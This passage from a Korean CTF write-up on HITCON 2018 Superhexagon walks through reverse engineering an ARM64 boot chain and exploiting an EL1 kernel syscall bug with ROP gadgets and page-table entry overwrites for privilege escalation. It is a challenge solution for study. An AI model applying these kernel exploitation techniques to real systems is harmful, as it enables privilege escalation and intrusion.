</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">arm_setup_direct_kernel_boot</span>(cpu, info);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>reset시에 호출될 do_reset 함수를 콜백으로 등록하고, rom의 0x0부터 실행을 시작한다.<br>
IROM 내부에서 돌아가는 BL0를 에뮬레이션한 부분으로 이해했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  sctlr_el3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x30c50830</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>();
</span></span><span style="display:flex;"><span>  vbar_el3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2000</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>();
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> sctlr_el3;
</span></span><span style="display:flex;"><span>  sctlr_el3 <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x100a</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>();
</span></span><span style="display:flex;"><span>  scr_el3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x238</span>;
</span></span><span style="display:flex;"><span>  mdcr_el3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x18000</span>;
</span></span><span style="display:flex;"><span>  ...
</span></span></code></pre></div><p>위처럼 sctlr_el3 같은 레지스터에 접근하는 것을 볼 수 있다.<br>
시스템 레지스터 뒤에 붙은 접미사는 최소 접근 권한을 뜻한다.</p>
<h3 id="cpsr-structure--gdbscript">CPSR structure &amp; gdbscript<a hidden class="anchor" aria-hidden="true" href="#cpsr-structure--gdbscript">#</a></h3>
<p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/f3aa540191ec4ca14c72cb878bcd003e.png" alt=""  />
<br>
처음에 부팅하고 CPSR 레지스터를 확인하면 현재의 Exception level을 알 수 있다.<br>
이를 참고하여 cpsr을 확인하는 명령어 지원을 추가했다.<br>
gdb에 로드하고 0x0 번지부터 cpsr의 값을 확인해보면 다음과 같다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>gef<span style="color:#f92672">&gt;</span> cpsr
</span></span><span style="display:flex;"><span>EL3h<span style="color:#f92672">|</span> FIQ_MASKED <span style="color:#f92672">|</span> COND_8
</span></span></code></pre></div><p>초기 부팅시에 코드는 EL3 코드라는 것을 알 수 있다.</p>
<h3 id="sctlr_elx-structure">SCTLR_ELx structure<a hidden class="anchor" aria-hidden="true" href="#sctlr_elx-structure">#</a></h3>
<p>초기에 EL3로 부팅을 시작하고, 이때 virtual memory system이 활성화 되었는지 확인하려면 M bit를 확인하면 된다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/5c404d7525a8647a30a51f42976236f1.png" alt=""  />
<br>
arm 프로세서는 power up시에 cold reset이 수행된다.<br>
메뉴얼에서 warm reset시 M bit가 0으로 세팅되며, 메뉴얼에선 warm reset에서 reset되는 필드는 모두 cold reset에서도 reset된다고 했다.<br>
그렇기에 SCTLR_EL3.M bit는 0으로 IMPLEMENTATION DEFINED 값이다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/f9ba4807b29236f4b72182e35beef3cc.png" alt=""  />
<br>
실제로도 0으로 세팅되어있는 것을 볼 수 있다.<br>
0x0 번지부터 실행될 때에는 당연하지만 가상 주소가 꺼져있음을 알 수 있다.</p>
<h2 id="identifying-exception-handlers">Identifying exception handlers<a hidden class="anchor" aria-hidden="true" href="#identifying-exception-handlers">#</a></h2>
<h3 id="vbar_elx-structure">VBAR_ELx structure<a hidden class="anchor" aria-hidden="true" href="#vbar_elx-structure">#</a></h3>
<p>exception이 일어나면 exception vector에 등록된 handler가 호출된다.</p>
<h3 id="exception-vector-structure">Exception vector structure<a hidden class="anchor" aria-hidden="true" href="#exception-vector-structure">#</a></h3>
<p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/37ba2f586ef0f39b47ea7eed4c2ce8c2.png" alt=""  />
<br>
0x80 align 되어있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#ae81ff">00000010</span> <span style="color:#ae81ff">80</span>  ff  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">10</span>    adr        x0,<span style="color:#ae81ff">0x2000</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000014</span> <span style="color:#ae81ff">00</span>  c0  <span style="color:#ae81ff">1</span>e  d5    msr        vbar_el3 ,x0
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000001</span><span style="color:#ae81ff">8</span> df  <span style="color:#ae81ff">3f</span>  <span style="color:#ae81ff">03</span>  d5    isb
</span></span></code></pre></div><p>이제 exception vector가 어떻게 생겼는지 알고 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>define RAMLIMIT_GB <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>define <span style="color:#a6e22e">RAMLIMIT_BYTES</span> (RAMLIMIT_GB <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024ULL</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> MemMapEntry memmap[] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#75715e">/* Space up to 0x8000000 is reserved for a boot ROM */</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_FLASH] <span style="color:#f92672">=</span>              {          <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x08000000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_CPUPERIPHS] <span style="color:#f92672">=</span>         { <span style="color:#ae81ff">0x08000000</span>, <span style="color:#ae81ff">0x00020000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_UART] <span style="color:#f92672">=</span>               { <span style="color:#ae81ff">0x09000000</span>, <span style="color:#ae81ff">0x00001000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_SECURE_MEM] <span style="color:#f92672">=</span>         { <span style="color:#ae81ff">0x0e000000</span>, <span style="color:#ae81ff">0x01000000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_MEM] <span style="color:#f92672">=</span>                { <span style="color:#ae81ff">0x40000000</span>, RAMLIMIT_BYTES },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>};
</span></span></code></pre></div><p>앞서 물리 메모리 레이아웃을 patch 파일을 통해 식별했다.<br>
VIRT_FLASH 부터 적재되었고, physical address를 쓰니 0x2000 그대로 상수값대로 접근하면 될 것이다.<br>
ghidra를 통해 적당히 0x80씩 더해가며 디스어셈블해보니 exception handler를 식별할 수 있었다.<br>
대충 어떤식으로 분석을 시도해야하는지 알게 되었다.<br>
그런데 지금 취약점을 찾아서 익스플로잇해야하는 부분은 EL3가 아닌 EL1이다.<br>
일단 EL3의 exception vector를 찾았으니 나중을 위해 남겨두고 다시 부트로더를 분석해야한다.</p>
<p>부트로더가 어떤 동작을 하고 있는지 이제 이해할 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(<span style="color:#ae81ff">0xE002000</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x202000</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(<span style="color:#ae81ff">0xE000000</span>, <span style="color:#ae81ff">0x002850</span>, <span style="color:#ae81ff">0x68</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(<span style="color:#ae81ff">0x40100000</span>, <span style="color:#ae81ff">0x10000</span>, <span style="color:#ae81ff">0x10000</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(<span style="color:#ae81ff">0xE400000</span>, <span style="color:#ae81ff">0x20000</span>, <span style="color:#ae81ff">0x90000</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(<span style="color:#ae81ff">0x40000000</span>, <span style="color:#ae81ff">0xb0000</span>, <span style="color:#ae81ff">0x10000</span>)
</span></span></code></pre></div><p>아까 위에서 얘기했듯이 S-EL3는 코드 무결성을 위해 코드는 DRAM에 올라가지 않는다.<br>
0x10000를 확인했더니 EL2 코드를 확인할 수 있었다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/e9e0b1a5ed7af29efb381c972df1b94d.png" alt=""  />
<br>
물리메모리 맵에 따라 적재된 이후 실행되었기 때문에 이러한 주소를 가지게 된다.<br>
여기서 EL1의 exception vector 주소는 가상 주소로 설정되어있다.<br>
0xb0000에서 EL1을 확인할 수 있었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ttbr0_el1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xb1000</span>;
</span></span><span style="display:flex;"><span>ttbr1_el1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xb4000</span>;
</span></span><span style="display:flex;"><span>tcr_el1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6080100010</span>;
</span></span><span style="display:flex;"><span>uVar1 <span style="color:#f92672">=</span> sctlr_el1;
</span></span><span style="display:flex;"><span>sctlr_el1 <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>;
</span></span></code></pre></div><p>이런식으로 virtual memory system을 활성화하고 점프한다.<br>
EL1까지 찾았으니 소거법으로 마지막 남은 0x20000은 S-EL1에 해당할 것이다.<br>
BL1 부팅을 좀 더 확인해보면, EL3에서 eret으로 EL2로 내려가서 부팅을 마저 수행한다.<br>
그리고 IPA 0x0부터 EL1을 마저 부팅하게 되며 이때 TEE OS를 초기화한다.</p>
<h3 id="extracting-el1-s-el1-el2-binaries">Extracting EL1, S-EL1, EL2 binaries<a hidden class="anchor" aria-hidden="true" href="#extracting-el1-s-el1-el2-binaries">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>.<span style="color:#f92672">/</span>bios.bin of<span style="color:#f92672">=</span>EL1.out bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1024</span> skip<span style="color:#f92672">=</span><span style="color:#ae81ff">704</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>.<span style="color:#f92672">/</span>bios.bin of<span style="color:#f92672">=</span>S<span style="color:#f92672">-</span>EL1.out bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1024</span> skip<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">576</span>
</span></span><span style="display:flex;"><span>dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>.<span style="color:#f92672">/</span>bios.bin of<span style="color:#f92672">=</span>EL2.out bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1024</span> skip<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span>
</span></span></code></pre></div><p>이제 EL1을 분석할 수 있게 되었다.</p>
<h4 id="tcr_elx-structure--gdbscript">TCR_ELx structure &amp; gdbscript<a hidden class="anchor" aria-hidden="true" href="#tcr_elx-structure--gdbscript">#</a></h4>
<p>arm manual에서는 두 개의 VA ranges를 지원하기 위해 TTBR0, TTBR1를 이용한다고 나와있다.<br>
그리고 이 두 개의 VA ranges에 대해서 각자에 TCR의 TxSz로 범위가 지정된다고 한다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/bf81066fd0902de1dba3e4b2ad789558.png" alt=""  />
<br>
메뉴얼보고 gdbscript로 파싱하는 스크립트를 작성해서 명령어를 추가했다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/3e84675b085fcf5812bbf9c423b10916.png" alt=""  />
<br>
이러한 범위로 이용되는 것을 확인했다.<br>
TTBR이 가리키고 있는 물리 메모리 영역을 읽어야한다.<br>
qemu에선 gdb-stub을 제공해줘서 monitor 명령어를 이용해서 물리 메모리를 읽을 수 있다.<br>
메모리 region을 보면 cpu-memory-0를 제외하고는 모두 secure-memory-0의 subregion으로 존재한다.</p>
<h3 id="accessing-secure-memory--gdbscript">Accessing secure memory &amp; gdbscript<a hidden class="anchor" aria-hidden="true" href="#accessing-secure-memory--gdbscript">#</a></h3>
<p>각자의 EL에서 디버깅을 할텐데 해당 EL에선 더 상위 EL의 메모리를 읽지 못한다.<br>
gdbstub에서 xp라는 명령으로 물리메모리에 액세스가 가능해서 편하게 물리메모리 영역을 덤프할 수 있다.<br>
근데 문제는 Secure world의 메모리는 전혀 읽지 못한다는 점이다.<br>
이는 qemu가 secure world가 메모리 격리를 고려해서 NS 비트가 세팅되지 않았을때 secure world 메모리를 읽지 못하도록 구현한 것으로 보인다.<br>
전체 Secure/Non-secure world의 모든 물리 메모리를 접근하고 덤프하는 툴이 있으면 분석하기 편할 것 같아서 만들기로 결정했다.</p>
<p>다른 오픈소스 프로젝트들을 참고해서 arm64의 secure memory에 대한 물리 메모리 읽기를 어떤 방식으로 구현했는지 확인했다.<br>
이를 바탕으로 직접 gdbscript를 작성하여 메모리 트리를 직접 확인하고 secure memory를 포함한 region을 재귀적으로 찾고 호스트 메모리에서 읽는 명령어 지원을 추가했다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/f44261bee663ddbd2e5ba43cb51214b9.png" alt=""  />
<br>
정상적으로 secure memory를 확인할 수 있게 되었다.<br>
이를 이용하면 직접 다른 exception level들이 어떻게 secure memory에 적재되는지 확인할 수 있을 것이다.</p>
<h2 id="el1-non-secure-kernel">EL1, Non-secure Kernel<a hidden class="anchor" aria-hidden="true" href="#el1-non-secure-kernel">#</a></h2>
<p>유저 애플리케이션을 익스플로잇했으니 이제 커널로의 권한 상승을 해야한다.<br>
bata24 gef에선 arm64에 대한 pagewalk가 지원된다.<br>
VBAR을 확인하면 handler들이 보인다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/37ba2f586ef0f39b47ea7eed4c2ce8c2.png" alt=""  />
<br>
system call은 synchronous 하고 lower exception level에서부터 발생하니 해당 부분을 확인해서 분석을 시작했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  uVar11 <span style="color:#f92672">=</span> esr_el1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (((uint)(uVar11 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">26</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3f</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>b00010101) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_ffffffffc00091b0</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>EC field에 접근하고 있다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/0523118c2efb65bdb686270a2fc24f54.png" alt=""  />
<br>
딱 봐도 이 함수는 위 두 값에 대한 비교를 하는 함수인 것을 알 수 있다.<br>
sys_read, sys_write는 0xffffffffc9000000을 읽거나 쓴다는 것을 알 수 있었다.<br>
IPA는 0x3b000이며 PA는 0x9000000이다.<br>
여긴 UART mmio 영역이다.<br>
sys_read는 내부적으로 1 바이트씩 여기서 읽고 리턴한다.</p>
<h3 id="vulnerability-1">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability-1">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>              phys <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_ffffffffc0008530</span>(x1);
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">for</span> (usr_page <span style="color:#f92672">=</span> usr; usr_page <span style="color:#f92672">&lt;</span> x1 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)usr; usr_page <span style="color:#f92672">=</span> usr_page <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">FUN_ffffffffc0008864</span>(usr_page,usr_page <span style="color:#f92672">+</span> (phys <span style="color:#f92672">-</span> (<span style="color:#66d9ef">long</span>)usr),(ulong)x2 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span> );
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>ELx에서의 가상 주소 액세스는 분명 ELx의 translation table base address를 타고 변환될텐데 x1에 대한 privileged, unprivileged 체크가 없어서 이상함을 느꼈다.<br>
다른 시스템 콜들의 경우 1 단계 변환후 attribute를 비교해서 user memory인지 아닌지를 검사한다.</p>
<p>ropper로 쭉 뽑고 보다가 0xffffffffc0009130 가젯을 쓸 수 있을 것이라고 생각했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>     fffc0009130 fc  <span style="color:#ae81ff">7f</span>  <span style="color:#ae81ff">40</span>  f9    ldr        x28 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xf8</span> ]
</span></span><span style="display:flex;"><span>     fffc0009134 <span style="color:#ae81ff">1</span>c  <span style="color:#ae81ff">41</span>  <span style="color:#ae81ff">18</span>  d5    msr        sp_el0 ,x28
</span></span><span style="display:flex;"><span>     fffc0009138 fc  <span style="color:#ae81ff">77</span>  <span style="color:#ae81ff">4</span>e  a9    ldp        x28 ,x29 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_24 ]
</span></span><span style="display:flex;"><span>     fffc000913c c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span></code></pre></div><p>삽질하다가 메뉴얼을 뒤져보니 다음과 같이 UNDEFINED로 정의되어있었다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/f81b8606d985754ac8e51b84bec94050.png" alt=""  />
<br>
handler가 SP_ELxh에서 SP_ELxt로 최대한 빨리 전환을 시도하기에 절대 쓸 수 없는 가젯이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>     fffc0009430 f3  <span style="color:#ae81ff">53</span>  <span style="color:#ae81ff">41</span>  a9    ldp        x19 ,x20 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>local_10 ]
</span></span><span style="display:flex;"><span>     fffc0009434 fd  <span style="color:#ae81ff">7</span>b  c2  a8    ldp        x29 <span style="color:#f92672">=&gt;</span>local_20 ,x30 ,[sp], <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>     fffc0009438 c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span></code></pre></div><p>더 찾다가 위 가젯을 찾았다.<br>
sp+80에 연속적으로 쓸 수 있으니 저기부터 흐름을 두 번 연속으로 변조하면 pc 컨트롤이 가능하다.<br>
ret 1 byte overwrite → print_flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#a6e22e">Paused</span> (press any to <span style="color:#66d9ef">continue</span>)
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Switching to interactive mode
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Flag</span> (EL1)<span style="color:#f92672">:</span> hitcon{this is flag <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">for</span> EL1}
</span></span></code></pre></div><h3 id="gaining-code-execution">Gaining code execution<a hidden class="anchor" aria-hidden="true" href="#gaining-code-execution">#</a></h3>
<p>Arm manual 보면서 page descriptor도 봤었다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/3062a0126cbe537d237e93e411300ead.png" alt=""  />
<br>
Two VA ranges를 지원할 때 translation 과정은 stage 1과 stage 2로 나뉜다.<br>
VA → IPA → PA 중에 실질적으로 공격할 수 있는건 IPA까지여서 VA → IPA를 속여서 공격하는 것을 생각해볼 수 있다.<br>
이는 VA → IPA의 매핑 관계가 EL1의 영역에 존재하기에 가능하다.<br>
잘 조작해서 임의 VA에 대해서 원하는 IPA로 매핑할 수 있다면, EL0 쪽 메모리와 매핑시켜 특권 레벨에서 code execution이 가능하다.<br>
PAN을 확인해봤는데 PAN이 비활성화되어 있었으니 그냥 userland에 fake page table을 준비해두고 초기 코드에 TTBR에 대한 할당을 수행하는 특권 명령을 실행하는데 여기로 점프하면 임의 코드 실행을 얻을 수 있을 것 같았다.</p>
<p>혹시 MMU 킨 상태에선 TTBR1에 대한 할당이 트랩을 일으킬까봐 메뉴얼을 봤더니 따로 그런 검증 로직은 없었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>     fffc000000c <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">18</span>  d5    msr        ttbr1_el1 ,x0
</span></span><span style="display:flex;"><span>     fffc0000010 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">02</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#75715e">#0x10</span>
</span></span><span style="display:flex;"><span>     fffc0000014 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">02</span>  b0  f2    movk       x0,<span style="color:#75715e">#0x8010 , LSL #16</span>
</span></span><span style="display:flex;"><span>     fffc0000018 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">0</span>c  c0  f2    movk       x0,<span style="color:#75715e">#0x60 , LSL #32</span>
</span></span><span style="display:flex;"><span>     fffc000001c <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">18</span>  d5    msr        tcr_el1 ,x0
</span></span><span style="display:flex;"><span>     fffc0000020 df  <span style="color:#ae81ff">3</span>f  <span style="color:#ae81ff">03</span>  d5    isb
</span></span><span style="display:flex;"><span>     fffc0000024 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x0,sctlr_el1
</span></span><span style="display:flex;"><span>     fffc0000028 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">40</span>  b2    orr        x0,x0,<span style="color:#75715e">#0x1</span>
</span></span><span style="display:flex;"><span>     fffc000002c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">18</span>  d5    msr        sctlr_el1 ,x0
</span></span><span style="display:flex;"><span>     fffc0000030 df  <span style="color:#ae81ff">3</span>f  <span style="color:#ae81ff">03</span>  d5    isb
</span></span><span style="display:flex;"><span>     fffc0000034 e0  <span style="color:#ae81ff">87</span>  <span style="color:#ae81ff">62</span>  b2    orr        x0,xzr ,<span style="color:#75715e">#-0x40000000</span>
</span></span><span style="display:flex;"><span>     fffc0000038 <span style="color:#ae81ff">41</span>  fe  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">10</span>    adr        x1,<span style="color:#f92672">-</span><span style="color:#ae81ff">0x3fff8000</span>
</span></span><span style="display:flex;"><span>     fffc000003c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">8</span>b    add        x0,x0,x1
</span></span><span style="display:flex;"><span>     fffc0000040 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">1</span>f  d6    br         x0<span style="color:#f92672">=&gt;</span>LAB_ffffffff80008000
</span></span></code></pre></div><p>어차피 TTBR1_EL1 바꾸면 두 번째 VA가 TTBR1 타고 변환하니 fault 안만들고 그냥 안정적으로 임의 코드 실행을 달성할 수 있을 것 같다.<br>
근데 유저랜드에서 fake page table 만들려면 4kb 이상의 방대한 메모리가 필요하고, 하나 하나 다시 써야한다.</p>
<p>그래서 read로 EL1의 PTE를 덮어서 IPA를 바꿔주는 것을 선택했다.<br>
아니면 유저쪽 PXN 비트를 떨구고 거기로 뛰어도 된다고 한다.<br>
그게 더 간단하지만 풀 때는 그 생각을 못했다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/608f926465b4c3187cacd39b49cdb2cc.png" alt=""  />
<br>
0xffffffffc001e000 -&gt; 0x1e000 -&gt; 0x4001e000로 변환되니까 저 부분을 수정하면 된다.</p>
<p>0x0040000000036483로 바꿔주면 미리 mmap 해놓은 유저 페이지를 실행하게 된다.<br>
PTE 수정하려면 2바이트가 필요한데 read는 한번에 1바이트씩만 쓸수 있다.<br>
1바이트만 달라져도 qemu에서 tlb 자체를 완전한 환경에 맞춰 구현하지 않아 바로 fault가 발생한다.</p>
<p>그래서 저 페이지 테이블 자체를 가리키는 descriptor의 AP를 변경해서 EL0에서 RW를 만들었다.<br>
그리고 EL0에서 8바이트 전체를 써주는 방식으로 진행하면 될것 같았다.<br>
mprotect R-X를 해줘야 EL2 MMU에 변경된 execution 권한이 적용된다.</p>
<p>EL2는 물리 메모리로 접근하니 손으로 pagewalk해서 확인해보았다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/31b56e89303d73261e575a9371ec0a69.png" alt=""  />
<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/b44e6058081871ec76484838169c896b.png" alt=""  />
<br>
mprotect r-x 안했을때 stage 2 translation의 주체인 EL2의 page table에 EL0/1 execution이 비활성화 되었음을 알 수 있다.<br>
bata24 gef를 이용하고 있는데 버그가 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#ae81ff">1</span>) <span style="color:#ae81ff">0x0000000000034000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0000000000037000</span>  <span style="color:#ae81ff">0x0000000040034000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0000000040037000</span>  <span style="color:#ae81ff">0x3000</span>        <span style="color:#ae81ff">0x1000</span>      <span style="color:#ae81ff">3</span>      [EL0<span style="color:#f92672">/</span>R<span style="color:#f92672">-</span>X EL1<span style="color:#f92672">/</span>R<span style="color:#f92672">-</span>X ACCESSED]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>) <span style="color:#ae81ff">0x0000000000036000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x000000000003b000</span>  <span style="color:#ae81ff">0x0000000040036000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x000000004003b000</span>  <span style="color:#ae81ff">0x5000</span>       <span style="color:#ae81ff">0x1000</span>      <span style="color:#ae81ff">5</span>      [EL0<span style="color:#f92672">/</span>RWX EL1<span style="color:#f92672">/</span>RWX ACCESSED]
</span></span></code></pre></div><p>1번이 mprotect r-x 해줬을 때 gef가 보여주는 EL2 매핑이다.<br>
2번이 mprotect 안해줬을 때 gef가 보여주는 EL2 매핑이다.<br>
gef 코드를 보니 따로 WXN는 신경을 쓰는데, FEAT_XNX는 stage 2라서 그런지 따로 확인하지 않는다.<br>
